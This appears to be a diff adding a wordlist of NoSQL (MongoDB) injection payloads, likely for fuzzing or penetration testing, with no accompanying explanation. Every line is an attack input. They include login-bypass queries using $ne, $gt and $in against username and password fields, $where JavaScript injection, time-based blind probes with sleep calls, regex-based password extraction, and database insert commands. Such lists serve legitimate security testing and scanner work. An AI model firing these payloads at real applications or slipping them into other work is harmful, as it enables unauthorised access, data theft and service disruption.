@@ -1,0 +1,57 @@
+'
+/}}}}}}}}}}}}}:'"\;{
+'"`{
+'"\/$[].>
+;$Foo}
+$Foo \xYZ
+'"`{%0A;$Foo}%0A$Foo \xYZ
+'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
+' || 1==1//
+' || 1==1%00
+admin' || 'a'=='a
+$where: '1 == 1'
+' && 0 && 'x
+' && 1 && 'x
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+' || '1'=='1
+' || 'xowl'=='xowl
+' } ], $comment:'successful MongoDB injection'
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+', $or: [ {}, { 'a':'a
+', $where: '1 == 1
+', $where: '1 == 1'
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+';sleep(20000);
+'||'56'=='56'
+'||1||'
+, $where: '1 == 1'
+1, $where: '1 == 1'
+;return true
+;sleep(20000);
+[$ne]=1
+[$ne]=nobody
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+true, $where: '1 == 1'
+{ $ne: "alsefiafnalseixhlwwx" }
+{ $ne: 1 }
+{"$and": [ {"id": 5}, {"id": 6} ]}
+{"$gt": ""}
+{"$in": []}
+{"$ne": -1}
+{"$or": [{},{"foo":"1"}]}
+{"$where":  "return true"}
+{"$where":  "sleep(20000)"}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$gt":""}, "password": {"$gt":""}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
+{$gt: ''}
+{$nin: [""]}}
+|| 1==1
+|| 1==1%00
+|| 1==1//
+}, { password : /.*/ }
